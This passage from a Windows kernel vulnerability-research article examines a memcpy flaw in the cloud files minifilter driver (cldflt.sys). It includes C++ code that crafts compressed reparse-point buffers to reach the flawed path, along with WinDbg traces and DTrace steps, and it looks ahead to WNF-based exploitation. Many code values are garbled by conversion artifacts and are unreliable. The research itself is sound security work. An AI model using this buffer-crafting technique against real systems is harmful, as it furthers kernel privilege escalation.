\[+\] BtRp header: \[-\] $+ \\Theta \\cal { 4 }$ : magic=0x70527442 \[-\] $+ \\Theta 8$ : crc=0x31163BDB \[-\] $+ \\infty C$ : ushortLen=652 \[-\] $\\yen 10$ : flags=0x0002 \[-\] $\\yen 12$ : numberOfElements=5 \[-\] totalSize $\\mathtt { \\mathtt { = 6 5 2 } }$\
\
\[+\] BtRpData bas $e = \\Theta \\times 3 C$ \[-\] elements\[0\]: type=0x07 len $^ { = 1 }$ off $\\therefore = Q \\times 6 \\textcircled { 2 }$ \[-\] elements\[1\]: type=0x07 len $^ { = 1 }$ off=0x64 \[-\] elements\[2\]: type=0x07 len $^ { = 1 }$ off=0x68 \[-\] elements\[3\]: type=0x06 len $\\mathtt { = 8 }$ off=0x6C \[-\] elements\[4\]: type=0x11 len $= 5 2 8$ off $\\yen 6$ $\[ + \]$ FeRp size: $\\Theta \\times \\Theta 3 \\Theta 8$ $\[ + \]$ FeRp header: \[-\] $+ \\Theta \\Theta$ : version=0x0001 \[-\] $+ \\textcircled { \\cdot } 2$ : structSize=776 \[-\] $+ \\Theta \\cal { 4 }$ : magic=0x70526546 \[-\] $+ \\Theta 8$ : crc=0x64EE30A7 \[-\] $+ \\infty C$ : dwordLen=772 \[-\] $\\yen 10$ : flags=0x0002 \[-\] $\\yen 12$ : max\_elements $\\mathtt { \\Lambda } = \\mathtt { 1 0 }$ $\[ + \]$ Computed totalSize $=$ 776 $\[ + \]$ FeRpData bas $\\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial } \\mathtt { \\partial }$ (reserved 10 descriptors) \[-\] elements\[0\]: type $\\mathtt { \\mathtt { \\mathtt { \\mathtt { \\mathtt { \\Lambda } = 0 \\times 0 7 } } } }$ len $^ { = 1 }$ off $\\Longrightarrow 0 \\times 6 \\Theta$ \[-\] elements\[1\]: type $\\mathtt { \\Gamma = 0 \\times 0 A }$ len $\\mathord { = } 4$ off $= 0 \\times 6 4$ \[-\] elements\[2\]: type $ \[ = 0 \\times \\Theta 6 $ len $\\mathtt { = 8 }$ of $f = \\Theta \\times 6 8$ \[-\] elements\[3\]: type $\\boldsymbol { \\mathsf { \\Omega } } = \\boldsymbol { \\mathsf { Q } } \\times \\boldsymbol { \\mathsf { 1 1 } }$ len $\\mathord { = } 4$ o $V = \\Theta \\times 6 C$ \[-\] elements\[4\]: type $\\mathtt { = 0 } \\mathtt { \\times 1 } 1$ len $= 6 5 2$ off $\\yen 0$ $\[ + \]$ Compressed FeRp size: $\\Theta \\times 9 2$\
\
$\[ \+ \]$ DeviceIoControl (FSCTL\_SET\_REPARSE\_POINT\_EX) succeeded (file)\
\
$\[ \+ \]$ GET\_REPARSE (file): tag=0x9000601A, len $\\mathtt { \\mathtt { = 1 5 6 } }$ , total $\\mathtt { . 1 5 8 }$\
\
$\[ \+ \]$ Opening file again to check the file\
\
$\[ \+ \]$ File reopened successfully, handle=0000000000000224\
\
\[i\] File handle closed again\
\
\[i\] Sync root unregistered. File left in place:\
\
C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot\\ers06\
\
\[Figure 92\]: reparse\_point program: output\
\
Check the content of the reparse point itself by executing the following command:\
\
C:\\Users\\Administrator\\Desktop\\RESEARCH>fsutil reparsepoint query "C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot\\ers06"\
\
Reparse Tag Value : 0x9000601a Tag value: Microsoft Tag value: Directory\
\
![](https://exploitreversing.com/wp-content/uploads/2026/02/images/386a998e8f2ccb3627cf46c44614cb132ee6c07d064a9ec0aa5a13db9bb77ab1.jpg)\
\
\[Figure 93\]: Verifying the created reparse point\
\
As you can see, the fsutil command is able to confirm that the reparse point has been created successfully.\
\
To follow the execution on WinDbg, the following breakpoints have setup, and execution can be followed step-by-step:\
\
1: kd> bl\
\
1: kd> bp cldflt!HsmpCtxCreateStreamContext\
\
1: kd> cldflt!HsmIBitmapNORMALOpen\
\
1: kd> bp cldflt!HsmpRpValidateBuffer\
\
1: kd> bp cldflt!HsmpBitmapIsReparseBufferSupported\
\
1: kd> bp cldflt!HsmIBitmapNORMALOpen+0x601\
\
1: kd> bp cldflt!HsmIBitmapNORMALOpen+0x6da\
\
|     |     |     |     |\
| --- | --- | --- | --- |\
| 1: kd> bl 0 e Disable Clear fffff807'67df9220 | 0001 (0001) |\
| cldflt!HsmpCtxCreateStreamContext |  |  | 0001 (0001) cldflt!HsmIBitmapNORMALOpen |\
|  | fffff807'67debf10 |\
| 1 e Disable Clear |  |\
| 2 e Disable Clear | fffff807'67dd4fc0 | 0001 (0001) | 0001 (0001) cldflt!HsmpRpValidateBuffer |\
| 3 e Disable Clear cldflt!HsmpBitmapIsReparseBufferSupported | fffff807'67de4528 |  |  |\
| 4 e Disable Clear | fffff807'67dec511 | 0001 (0001) |  |\
| cldflt!HsmIBitmapNORMALOpen+0x601 |  |  |  |\
| 5 e Disable Clear fffff807'67dec5ea |  | 0001 (0001) |  |\
\
The last two breakpoints are memcpy calls from HsmpBitmapIsReparseBufferSupported routine, which are associated with the vulnerability. In this first execution, which the data size of the fourth element is not large (smaller or equal to 4094), the first memcpy instruction ( memmove(p\_buffer\_dest, Src, Element\_Length) ) is hit but not the second one ( memmove(ptr\_buffer\_02, Src, Element\_Length); ). The step-by-step execution, which shows the pause on each breakpoint, follows:\
\
0: kd> g\
\
Breakpoint 0 hit\
\
cldflt!HsmpCtxCreateStreamContext:\
\
fffff807\`67df9220 48895c2408 mov qword ptr \[rsp+8\],rbx\
\
0: kd> g\
\
Breakpoint 2 hit\
\
cldflt!HsmpRpValidateBuffer:\
\
fffff807\`67dd4fc0 48895c2410 mov qword ptr \[rsp+10h\],rbx\
\
1: kd> g\
\
Breakpoint 0 hit\
\
cldflt!HsmpCtxCreateStreamContext:\
\
fffff807\`67df9220 48895c2408 mov qword ptr \[rsp+8\],rbx\
\
1: kd> g\
\
Breakpoint 2 hit\
\
cldflt!HsmpRpValidateBuffer:\
\
fffff807\`67dd4fc0 48895c2410 mov qword ptr \[rsp+10h\],rbx\
\
1: kd> g\
\
Breakpoint 3 hit\
\
cldflt!HsmpBitmapIsReparseBufferSupported:\
\
fffff807\`67de4528 48895c2408 mov qword ptr \[rsp+8\],rbx\
\
1: kd> g\
\
Breakpoint 1 hit\
\
cldflt!HsmIBitmapNORMALOpen:\
\
fffff807\`67debf10 488bc4 mov rax,rsp\
\
1: kd> g\
\
Breakpoint 4 hit\
\
cldflt!HsmIBitmapNORMALOpen+0x601:\
\
fffff807\`67dec511 e8aacffbff call cldflt!memcpy (fffff807\`67da94c0)\
\
1: kd> g\
\
Breakpoint 0 hit\
\
cldflt!HsmpCtxCreateStreamContext:\
\
fffff807\`67df9220 48895c2408 mov qword ptr \[rsp+8\],rbx\
\
1: kd> g\
\
Breakpoint 2 hit\
\
cldflt!HsmpRpValidateBuffer:\
\
fffff807\`67dd4fc0 48895c2410 mov qword ptr \[rsp+10h\],rbx\
\
1: kd> g\
\
Breakpoint 3 hit\
\
cldflt!HsmpBitmapIsReparseBufferSupported:\
\
fffff807\`67de4528 48895c2408 mov qword ptr \[rsp+8\],rbx\
\
1: kd> g\
\
Breakpoint 1 hit\
\
cldflt!HsmIBitmapNORMALOpen:\
\
fffff807\`67debf10 488bc4 mov rax,rsp\
\
1: kd> g\
\
Breakpoint 4 hit\
\
cldflt!HsmIBitmapNORMALOpen+0x601:\
\
fffff807\`67dec511 e8aacffbff call cldflt!memcpy (fffff807\`67da94c0)\
\
1: kd> k\
\
# Child-SP RetAddr Call Site\
\
00 ffffef0b\`94947dd0 fffff807\`67df9bb2 cldflt!HsmIBitmapNORMALOpen+0x601\
\
01 ffffef0b\`94947ea0 fffff807\`67dca6fe cldflt!HsmpCtxCreateStreamContext+0x992\
\
02 ffffef0b\`94947f80 fffff807\`67dc9aaa cldflt!HsmpSetupContexts+0x52e\
\
03 ffffef0b\`949480e0 fffff807\`67dc9899 cldflt!HsmiFltPostECPCREATE+0x1fa\
\
04 ffffef0b\`94948180 fffff807\`639d5b87 cldflt!HsmFltPostCREATE+0x9\
\
05 ffffef0b\`949481b0 fffff807\`639d545b FLTMGR!FltpPerformPostCallbacksWorker+0x347\
\
06 ffffef0b\`94948280 fffff807\`639d71a2 FLTMGR!FltpPassThroughCompletionWorker+0xfb\
\
07 ffffef0b\`94948320 fffff807\`63a09f54\
\
FLTMGR!FltpLegacyProcessingAfterPreCallbacksCompleted+0x322\
\
08 ffffef0b\`94948390 fffff807\`61611385 FLTMGR!FltpCreate+0x324\
\
09 ffffef0b\`94948440 fffff807\`6160d944 nt!IofCallDriver+0x55\
\
0a ffffef0b\`94948480 fffff807\`619ff58b nt!IoCallDriverWithTracing+0x34\
\
0b ffffef0b\`949484d0 fffff807\`61a1501e nt!IopParseDevice+0x11bb\
\
0c ffffef0b\`94948640 fffff807\`61a0ccea nt!ObpLookupObjectName+0x3fe\
\
0d ffffef0b\`94948810 fffff807\`619fd0ac nt!ObOpenObjectByNameEx+0x1fa\
\
0e ffffef0b\`94948940 fffff807\`619fbd69 nt!IopCreateFile+0x132c\
\
0f ffffef0b\`94948a00 fffff807\`6180f4f5 nt!NtCreateFile+0x79\
\
10 ffffef0b\`94948a90 00007ffd\`64f0db04 nt!KiSystemServiceCopyEnd+0x25\
\
11 000000f5\`cb4ff418 00007ffd\`626e6579 0x00007ffd\`64f0db04\
\
12 000000f5\`cb4ff420 00000000\`00000001 0x00007ffd\`626e6579\
\
13 000000f5\`cb4ff428 000000f5\`cb4ff6b0 0x1\
\
14 000000f5\`cb4ff430 00000000\`00000000 0x000000f5\`cb4ff6b0\
\
Observations about the source code of reparse\_point program need to be done:\
\
The ProviderID, defined as a macro, is the same one I generated previously and used to register the syncroot earlier in this section.\
\
To make the program easier to understand, I have created a series of enumerations and constant definitions. This approach may helps us later if we want to alter, expand or shrink the number of objects, offsets, buffers, and payload sizes.\
\
The statement #pragma pack(push, 1) changes the structure alignment to 1 byte, which attends our needs because it avoids any artificial padding and provides us with the possibility of reproducing the exact layout of structures. Soon after the structure definitions, this mechanism is disabled by using #pragma pack(pop) statement. There are several public CRC32 algorithms available on GitHub, as well as their respective implementation codes. Although I could have used several constants in the XOR operation, I chose to use only one, as it was sufficient.\
\
# [https://exploitreversing.com](https://exploitreversing.com/)\
\
ValidateBtRp and ValidateFeRp are helper routines that check and report on the values of each field created and used, ensuring data integrity throughout the process.\
\
While our program only manages five FeRp elements, which are submitted to the minifilter driver through the HsmpRpValidateBuffer routine as well as before this function by calling HsmIBitmapNORMALOpen routine, analyzing the HsmpCtxCreateStreamContext routine we understand that it is ready to manage up to 10 elements. Therefore, this information must be regarded as a formatting rule, whose payloads only start at the end of the element headers (as well referred as element descriptors - \_HSM\_ELEMENT\_INFO), regardless of all 10 elements exist or not.\
\
The math shown here is based on _HSM\_DATA structure: 16 bytes $+ ~ 1 0$ elements $^ \* 8$ bytes $\\mathtt { = } \\mathtt { = } 9 6$ bytes $= = 0 { \\times } 6 0$ bytes. As consequence, the payload starts at the offset $_ { 0 \\times 6 0 }$ onwards and does not matter whether all elements exist or not. As a side note, the potential total number of elements $( F e R p + B t R p )$ is 16 elements as defined by HSM\_ELEMENT\_TYPE\_MAX constant in the program and also in the reversed code.\
\
▪ The line $^ { \* } ( \\mathsf { U L O N G } ^ { \* } )$ (ferp\_ptr + FERP\_LENGTH) $=$ (ULONG)(position\_limit - 4) could seem complicated at first reading, but if we check the \_HSM\_DATA structure definition, we will realize that if we take its end point and subtract four bytes (Flags and MaxElement members), we get Length.\
\
typedef struct \_HSM\_DATA { ULONG Magic; ULONG Crc32; ULONG Length; USHORT Flags; USHORT NumberOfElements; HSM\_ELEMENT\_INFO ElementInfos\[\];\
\
} HSM\_DATA, $\\star$ PHSM\_DATA;\
\
\_HSM\_ELEMENT\_INFO structure has a metadata (header/descriptor) for each element that makes part of the reparse data.\
\
▪ There are subtleties that could make the interpretation a bit harder. An example, although I have already shown \_HSM\_ELEMENT\_INFO structure previously, the Length and Offset fields meanings need to be reaffirmed:\
\
typedef struct \_HSM\_ELEMENT\_INFO { USHORT Type; USHORT Length; ULONG Offset;\
\
} HSM\_ELEMENT\_INFO, $\\star$ PHSM\_ELEMENT\_INFO;\
\
▪ Length field represents the length of element data, as expected. However, Offset field represents the offset of the element since the start of \_HSM\_DATA.\
\
# [https://exploitreversing.com](https://exploitreversing.com/)\
\
DataBuffer member from \_REPARSE\_DATA\_BUFFER contains, in this case, a \_HSM\_REPARSE\_DATA type that has three fields (Flags, Length and FileData), and the last one (FileData) is an HSM\_DATA object (FeRp and BtRp), which is not compressed.\
\
▪ The statement USHORT total $=$ (USHORT)(max\_offset + 4); points to the start of payloads, after having declared all element descriptors (\_HSM\_ELEMENT\_INFO).\
\
The alignment of elements is always an important aspect to be regarded and there are two rules for alignment throughout of the code. The FeRp data requires eight-bytes alignment and BtRp data requires four-bytes alignment.\
\
In the computation of CRC32 hash and, in specific, when considering coverage length, I have subtracted 0xC ( ULONG crc\_len $\\underline { { \\underline { { \\mathbf { \\Pi } } } } }$ (ULONG)(position\_limit - 8 - 4); ). The reason here is that, in the internal representation of the FeRp data, there is a kind of “extended” version of \_HSM\_DATA (temporarily I will name it as \_HSM\_DATA\_INTERNAL), where the first two fields are new when compared with \_HSM\_DATA, and which can defined as shown below:\
\
typedef struct \_HSM\_DATA\_INTERNAL { USHORT Version; USHORT StructSize; ULONG Magic; ULONG Crc32; ULONG Length; USHORT Flags; USHORT NumberOfElements; HSM\_ELEMENT\_INFO ElementInfos\[\];\
\
} HSM\_DATA, $\\star$ PHSM\_DATA;\
\
The temporary \_HSM\_DATA\_INTERNAL structure definition comes from the own HsmpRpValidateBuffer routine (check the code shown previously).\
\
If you examine the structure, the Crc32 field covers everything that comes after it, thereby it does not include 8 (Magic $^ +$ Crc32) + 4 (Version and StructSize).\
\
▪ The following set of lines deserves some words:\
\
std::unique\_ptr<char $\[ \] >$ bt\_buf(new char\[BTRP\_BUFFER\_SIZE\]);\
\
memset(bt\_buf.get(), $\\odot$ , BTRP\_BUFFER\_SIZE); BYTE bt\_data\_00 $=$ $\\Theta \\times \\Theta 1$ ;\
\
BYTE bt\_data\_01 = $\\Theta \\times \\Theta 1$ ;\
\
BYTE bt\_data\_02 = $\\Theta \\times \\Theta \\Theta$ ;\
\
UINT64 bt\_data\_03 $=$ $\\Theta \\times$ ABCDABCDABCDABCD;\
\
char\* bt\_data\[BT\_COUNT\] $=$ { (char\*)&bt\_data\_00, (char\*)&bt\_data\_01, (char\*)&bt\_data\_02, (char\*)&bt\_data\_03,\
\
payload\_buf };\
\
I have declared dynamic allocated arrays using std::make\_unique, which returns a std::unique\_ptr that manages them and allows the code to automatically free the buffer later when it gets out of scope. However, the most important aspect is the choice of values for each element, which follows rules dictated and found by reversing HsmpBitmapIsReparseBufferSupported routine. Basically, the first three elements are BYTE values, and the fourth need to a UINT64 value. However, to the first value, there is a further condition that restricts it to be 0 or 1, and it has guided to choose 0x01 value and repeat it to the second but not third variable. The fourth variable can be any 64-bit number.\
\
# ▪ This piece of code could bring doubts:\
\
NTSTATUS st $=$ h\_CompressBuffer( 2, (PUCHAR)(input\_buffer $^ +$ 4), (ULONG)(input\_size - 4), (PUCHAR)output\_buffer, (ULONG)FERP\_BUFFER\_SIZE, FERP\_BUFFER\_SIZE, &finalCompressedSize, workspace.get()\
\
This code is the direct application of RtlCompressBuffer function, where the code compresses the data buffer (\_HSM\_DATA) before writing it into a file on disk, and we need to add 4 to the compressed\_size variable because \_HSM\_DATA makes part of the \_HSM\_REPARSE\_DATA structure, which already has two initial fields (Flags and Length). The COMPRESSED\_SIZE (0x1000) has been chosen to prevent any issue and respect the mini-filter driver code. Furthermore, the \_HSM\_REPARSE\_DATA.Length field holds the compressed data size $^ { + 4 }$ (due to the Flags and Length fields), the \_HSM\_DATA.Length field already had the uncompressed data and \_REPARSE\_DATA\_BUFFER\_EX.ReparseDataLength field contains the size of the entire \_HSM\_REPARSE\_DATA structure, including the compressed size.\
\
Readers can find a similar piece of code in multiple places in the minifilter driver as, for example, in HsmpOpCreatePlaceholders HsmpRpBuildBuffer HsmiRpInitializeTable HsmiRpCompressBuffer routine or HsmpOpCreatePlaceholders HsmpRpCreate HsmiRpInitializeTable HsmiRpCompressBuffer routine, and both apply the same approach we have learned:\
\
CompressionWorkSpaceSize $=$ RtlCompressBuffer( COMPRESSION\_FORMAT\_LZNT1, (PUCHAR)&uncompressed\_data->FileData, \*a1 - 4, (PUCHAR)&input\_buffer->FileData, \*a1 - 4, $\\Theta \\times \\underline { { 1 } } \\odot \\odot \\odot \\cup$ , &FinalCompressedSize, (char \*)input\_buffer $^ +$ (unsigned int)\*a1);\
\
}\
\
if ( CompressionWorkSpaceSize >= 0 )\
\
{ $\\vee 8 \ =$ FinalCompressedSize;\
\
$\\quad \\cup \\quad =$ FinalCompressedSize; if ( FinalCompressedSize $\\angle$ (unsigned \_\_int64)(unsigned int)\*a1 - 4 ) { \*(\_DWORD $\\star$ )&uncompressed\_data->Flags \| $=$ 0x8000u; memmove(v7, p\_FileData, v9); $\\star { \\sf a } { \\sf 1 } = \\vee 8 + 4$ ; } }\
\
The RtlCompressBuffer function takes an input from an uncompressed buffer and produces a compressed one, where the correct buffer size is returned by RtlGetCompressionWorkSpaceSize function. In this piece of code above, pay attention to uncompressed\_data->Flags $\\lvert = 0 \\times 8 0 0 0$ value, which means FILE\_NO\_COMPRESSION, FILE\_VOLUME\_IS\_COMPRESSED or even FS\_VOL\_IS\_COMPRESSED, which depends on the context, and in our case we are looking for compressed status.\
\
A similar approach can be adopted through the equivalent code for FeRp data, whose restrictions are given by HsmpRpValidateBuffer routine. In general, the variable type is the main restriction, but there are additional details that have to be followed:\
\
std::unique\_ptr<char\[\]> fe\_buf(new char\[FERP\_BUFFER\_SIZE\]);\
\
memset(fe\_buf.get(), 0, FERP\_BUFFER\_SIZE); BYTE fe\_data\_00 = $\\Theta \\times 9 9$ ;\
\
UINT32 fe\_data\_01 $=$ $\\Theta \\times \\odot \\odot \\odot \\odot \\odot \\odot \\odot 1$ ;\
\
UINT64 fe\_data\_02 $=$ $\\Theta \\times \\Theta \\odot \\Theta \\odot \\Theta \\odot \\Theta \\odot \\Theta \\odot \\Theta \\odot \\Theta \\odot \\Theta \\odot \\odot \\downarrow$ ;\
\
UINT32 fe\_data\_03 $=$ $\\Theta \\times \\odot \\odot \\odot \\odot \\odot 3 3$ ;\
\
char\* fe\_data\[FE\_COUNT\] $=$ { (char\*)&fe\_data\_00, (char\*)&fe\_data\_01, (char\*)&fe\_data\_02, (char\*)&fe\_data\_03, bt\_buf.get()\
\
};\
\
▪ The following block of code has different details that will be quickly explained in the next bullets:\
\
std::unique\_ptr<char\[\]> compressed(new char\[COMPRESSED\_SIZE\]);\
\
memset(compressed.get(), 0, COMPRESSED\_SIZE); unsigned long compressed\_size $=$ FeRpCompressBuffer(fe\_buf.get(), fe\_size,\
\
compressed.get()); if (compressed\_size $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\mathrm { \\Omega } } \\right.$ \|\| compressed\_size $>$ COMPRESSED\_SIZE) { printf("\[-\] Compression failed or output too large (%lu bytes)\\n",\
\
compressed\_size); return -1; } printf("\[+\] Compressed FeRp size: 0x%lX\\n", compressed\_size); USHORT cf\_payload\_len $=$ (USHORT)(4 $^ +$ compressed\_size);\
\
std::unique\_ptr<char\[\]> cf\_blob(new char\[cf\_payload\_len\]); memset(cf\_blob.get(), 0, cf\_payload\_len); $\\star$ (USHORT\*)(cf\_blob.get() + 0) $=$ $\\Theta \\times 8 \\Theta \\Theta 1$ ; // CompressionFlag (compressed) $\\star$ (USHORT\*)(cf\_blob.get() + 2) $=$ fe\_size; // Uncompressed FeRp size memcpy(cf\_blob.get() + 4, compressed.get(), compressed\_size);\
\
REPARSE\_DATA\_BUFFER\_EX rep\_data\_buffer\_ex{};\
\
rep\_data\_buffer\_ex.Flags $\\begin{array} { r l r } { \\mathrm { ~ ~ \\omega ~ } } & { { } = } & { \\odot \\times \\perp } \\end{array}$ ;\
\
rep\_data\_buffer\_ex. $\\mathsf { E x }$ istingReparseTag $=$ IO\_REPARSE\_TAG\_CLOUD\_6;\
\
rep\_data\_buffer\_ex. $\\mathsf { E x }$ istingReparseGuid $=$ ProviderId;\
\
rep\_data\_buffer\_ex.Reserved $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ;\
\
rep\_data\_buffer\_ex.ReparseDataBuffer.ReparseTag $=$ IO\_REPARSE\_TAG\_CLOUD\_6; rep\_data\_buffer\_ex.ReparseDataBuffer.ReparseDataLength $=$ cf\_payload\_len; rep\_data\_buffer\_ex.ReparseDataBuffer.Reserved $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; memcpy(rep\_data\_buffer\_ex.ReparseDataBuffer.GenericReparseBuffer.DataBuffer, cf\_blob.get(), cf\_payload\_len);\
\
▪ While the first lines above were explained in previous paragraphs, there are other points that deserve to be considered:\
\
Value 0x8000 means compressed and 0x0001 is associated with REPARSE\_DATA\_EX\_FLAG\_GIVEN\_TAG\_OR\_NONE, which forces the FSCTL\_SET\_REPARSE\_POINT\_EX to set the reparse tag if the file has no tag.\
\
IO\_REPARSE\_TAG\_CLOUD\_6 constant is associated with placeholders and reparse points.\
\
According to a previous explanation, ReparseDataLength field contains the length corresponding to the entire \_HSM\_REPARSE\_DATA structure, which is given by cf\_payload\_len variable.\
\
Observe that the \_HSM\_REPARSE\_DATA is built by setting Flags field to 0x8001, Length with the size of uncompressed data (it is a controversy, no doubt), and then setting the third field (FileData) with the compressed content (\_HSM\_DATA). The code uses the uncompressed size to guarantee that the space is enough to hold a future uncompressed buffer in the future without needing to allocate a new one only to this task. The length of the compressed buffer is stored into \_REPARSE\_DATA\_BUFFER\_EX.Length field.\
\
▪ The code calls DeviceIoControl with FSCTL\_SET\_REPARSE\_POINT\_EX to set a reparse point on a file, which is our first goal and later it uses DeviceIoControl with FSCTL\_GET\_REPARSE\_POINT to retrieve the same reparse point, which is the second objective.\
\
▪ The next stop in the code is to analyze the following lines:\
\
std::unique\_ptr<char\[\]> payload(new char\[PAYLOAD\_SIZE\]);\
\
memset(payload.get(), PAYLOAD\_INITIAL\_BYTE, PAYLOAD\_OFFSET);\
\
$\\star \\left( \\mathsf { U I N T } \\star \\right)$ (payload.get() $^ +$ PAYLOAD\_OFFSET) $=$ $\\Theta \\times$ DEADBEEF;\
\
$\\star \\left( \\mathsf { U I N T } \\star \\right)$ (payload.get() $^ +$ PAYLOAD\_OFFSET $^ +$ $\\Theta \\times \\Theta 4$ ) $=$ 0x12345678; $\\star \\left( \\mathsf { U I N T } \\star \\right)$ (payload.get() $^ +$ PAYLOAD\_OFFSET $^ +$ $\\Theta \\times \\Theta 8$ ) $=$ $\\Theta \\times$ ABCDEF00;\
\
$\\star \\left( \\mathsf { U I N T } \\star \\right)$ )(payload.get() $^ +$ PAYLOAD\_OFFSET $^ +$ $\\Theta \\times \\Theta C$ ) $=$ 0xC0DEC0DE;\
\
int rc $=$ BuildAndSetCloudFilesReparsePoint(hFile, PAYLOAD\_SIZE, payload.get()); if ( ${ \\mathsf { r c } } \\quad ! = \\quad \\odot ,$ ) {\
\
wprintf(L"\[-\] BuildAndSetCloudFilesReparsePoint failed\\n");\
\
}\
\
This structure could seem like a \_HSM\_DATA structure, but certainly it is not (not even close) and, as readers are going to learn in the exploitation section, it is a WNF structure, which will use actively to exploit the minifilter driver. For now, its values do make any sense, but they will be changed according to the convenience.\
\
In terms of goals, the program reaches the region related with the vulnerability, which has two memcpy instructions, but they do not cause crash or any other effect because, as I have commented previously, I limited offsets and sizes on purpose, which caused on the first memcpy has been executed. Anyway, this code basically emulates what is seen in the reversed code and uses well-known APIs to replicate minifilter driver behavior. It would have been suitable to use Windows Win32 CfApi to code a similar program because it wouldn’t be needed to concern with multiple details and it would be much more natural. On the other hand, CF APIs are exclusively associated with this topic and, unless you have interest in working focused on this subject, eventually it would be not worth it.\
\
The next step is to gain another perspective on how this mini-filter drivers work with reparse points using dynamic instrumentation. There is a wide range of possibilities and in this text we will used DTrace, which requires the following steps to install it:\
\
▪ Set \_NT\_SYMBOL\_PATH system variable to srv\*c:\\symbols\* [https://msdl.microsoft.com/download/symbols](https://msdl.microsoft.com/download/symbols). Download and install DTrace from [https://www.microsoft.com/enus/download/details.aspx?id=100441](https://www.microsoft.com/enus/download/details.aspx?id=100441) Setup the PATH variable to include DTrace binary: C:\\Program Files\\DTrace Enable DTrace: bcdedit /set dtrace on Critical detail: to use fbt (function boundary tracing), it is necessary to attach the WinDbg to the target system and also enable debug mode by executing bcdedit /set debug on. Reboot the target system.\
\
Using function boundary tracing (fbt), it is straight to check that cldflt kernel module provides an extensive list of probes, which can be shown by executing:\
\
C:\\Users\\Administrator>dtrace -ln "fbt:cldflt::" \| more\
\
|     |     |     |     |\
| --- | --- | --- | --- |\
| ID | PROVIDER | MODULE | FUNCTION NAME |\
| 4782 | fbt | cldflt | tlgKeywordOn entry |\
| 4783 | fbt | cldflt | tlgCreate1Sz\_char entry |\
| 4784 | fbt | cldflt | t tlgWriteTransfer\_EtwWriteTransfer entry |\
| 4785 | fbt | cldflt | tlgWriteTransfer\_EtwWriteTransfer return |\
| 4786 | fbt | cldflt | \_tlgWriteTemplate<long \_\_cdecl(\_tlgProvider\_t const \* |\
| \_\_ptr64,void int,\_EVENT\_DATA\_DESCRIPTOR \* --ptr64),&\_tlgWriteTransfe entry | const |  | \_ptr64,\_GUID const \* --ptr64,\_GUID const \* \_\_ptr64,unsigned |\
| 4787 | fbt |  | cldflt \_tlgWriteTemplate<long \_\_cdecl(\_tlgProvider\_t const \* \_\_ptr64,void const \* \_\_ptr64,\_GUID const \* -\_ptr64,\_GUID const \* \_\_ptr64,unsigned |\
|  |  |  | int,\_EVENT\_DATA\_DESCRIPTOR \* \_\_ptr64),&\_tlgWriteTransfe return |\
\
![](https://exploitreversing.com/wp-content/uploads/2026/02/images/c5abe359f76f0643d9ef78474126cde46987eb6e4c962df03353aecbef6181df.jpg)\
\
\[Figure 96\]: DTrace: list of cldflt.sys probes (truncated)\
\
As an example, if we were interested in interacting with HsmIBitmapNORMALOpen routine then we could run the following command that would be enough :\
\
\| findstr HsmIBitmapNORMALOpen HsmIBitmapNORMALOpen entry HsmIBitmapNORMALOpen return\
\
![](https://exploitreversing.com/wp-content/uploads/2026/02/images/1b46dc503e97a3b5d0d89d9a28d7fa6152192fc57f2cf7ad6a14dd2eb73dd7bf.jpg)\
\
\[Figure 97\]: DTrace: check for the existence of specific functions\
\
Obviously, I could have concentrated on listing only the entry point probes of routines ( dtrace -ln "fbt:cldflt::entry", which are usually more attractive, but I am sure you have got the idea.\
\
To trace all functions from cldflt.sys minifilter driver called by the reparse\_point.exe program, it is necessary to open two command prompt windows, where we are running DTrace command on the first one, and the program on the second one. Another small issue: in my system, the experiment didn’t work using “reparse\_point.exe” neither “reparsepoint.exe”. My general impression is that it does not work with long names, thereby the file has been named to reparse.exe. Therefore, execute DTrace command on the first command prompt window:\
\
C:\\Users\\Administrator\\Desktop\\RESEARCH>dtrace -Fn "fbt:cldflt::entry /execname=="reparse.exe"/{}" $>$ trace\_reparse.txt\
\
Then execute the reparse.exe program on the second command prompt window:\
\
C:\\Users\\Administrator\\Desktop\\RESEARCH>reparse.exe\
\
$\[ \+ \]$ Sync root directory ensured: C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot\
\
$\[ \+ \]$ Sync root registered at C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot\
\
\[i\] Existing file deleted: C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot\\ers06\
\
$\[ \+ \]$ File created: C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot\\ers06\
\
$\[ \+ \]$ BtBufferSize: $\\Theta \\times \\Theta 2 8 \\mathsf { C }$\
\
After running the program (reparse.exe), interrupt the DTrace command using $C T R L + C$ . The resulting trace\_reparse.txt contains the sequence of called functions from cldflt.sys, and all of them are indented, as shown below:\
\
CPU FUNCTION 0 -> HsmFltPreCREATE 0 -> HsmiFltPreECPCREATE 0 -> HsmOsIsCbdTransacted 0 -> HsmpIs32bitProcess 0 -> HsmpDbgBreakOnCbd 0 -> HsmiCreateAllocateECPTags 0 -> memset 0 -> HsmDbgBreakOnStatus 0 -> HsmDbgBreakOnStatus 0 -> \_security\_check\_cookie 1 -> HsmFltPostCREATE 1 -> HsmFltPostNETWORK\_QUERY\_OPEN 1 -> HsmiFltPostECPCREATE 1 -> HsmpTracePostCallbackEnter 1 -> HsmDbgBreakOnStatus 1 -> HsmFltPreNETWORK\_QUERY\_OPEN 1 -> HsmOsGetPlaceholderCompatMode 1 -> HsmpGetRequestorThread 1 -> HsmpGetRequestorMode 1 -> HsmiOsIsSyncProviderProcess 1 -> \_security\_check\_cookie 1 -> HsmpIs32bitProcess\
\
It is evident that the output format will be messed up because of the substantial number of functions being invoked and idented. As I am interested in learning the sequence of invoked calls, I have reformatted the output on Linux:\
\
root@ubuntu01:~# cat trace\_reparse.txt \| grep $- v$ HsmDbgBreakOnStatus \| grep -v WPP\* \| sed '1d' \| awk -F'->' '{ printf "%04d. %s\\n", NR, $$ 2$ trace\_reparse\_numbered.txt\
\
root@ubuntu01:~# cat trace\_reparse\_numbered.txt \| head -30\
\
01. HsmFltPreCREATE\
02. HsmiFltPreECPCREATE\
03. HsmOsIsCbdTransacted\
04. HsmpIs32bitProcess\
05. HsmpDbgBreakOnCbd\
